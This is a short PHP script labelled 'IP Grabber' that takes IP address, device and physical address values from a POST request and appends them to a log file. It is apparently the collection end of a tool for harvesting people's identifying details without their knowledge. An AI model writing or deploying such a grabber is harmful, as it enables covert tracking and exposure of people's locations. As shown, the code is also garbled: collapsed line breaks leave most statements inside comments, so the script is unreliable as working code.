<?php //IP Grabber
//Retrieve data from POST request $ip = $_POST['ip']; $device = $_POST['device']; $address = $_POST['address'];

//Print IP, Device, and Address To Log.TXT $fh = fopen('log.txt', 'a'); fwrite($fh, 'IP Address: '."".$ip ."\n"); fwrite($fh, 'Device: '."".$device ."\n"); fwrite($fh, 'Address: '."".$address ."\n\n"); fclose($fh); ?>
